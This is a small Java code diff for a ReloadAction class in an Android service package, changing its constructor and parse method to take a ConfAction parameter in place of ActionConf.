@@ -11,6 +11,8 @@ package com.android.service.action;
 
 import org.json.JSONObject;
 
+import com.android.service.conf.ConfAction;
+
 // TODO: Auto-generated Javadoc
 /**
  * The Class ReloadAction.
@@ -23,7 +25,7 @@ public class ReloadAction extends SubAction {
 	 * @param params
 	 *            the conf params
 	 */
-	public ReloadAction(final ActionConf params) {
+	public ReloadAction(final ConfAction params) {
 		super(params);
 	}
 
@@ -39,7 +41,7 @@ public class ReloadAction extends SubAction {
 	}
 
 	@Override
-	protected boolean parse(ActionConf params) {
+	protected boolean parse(ConfAction params) {
 		return true;
 	}
 
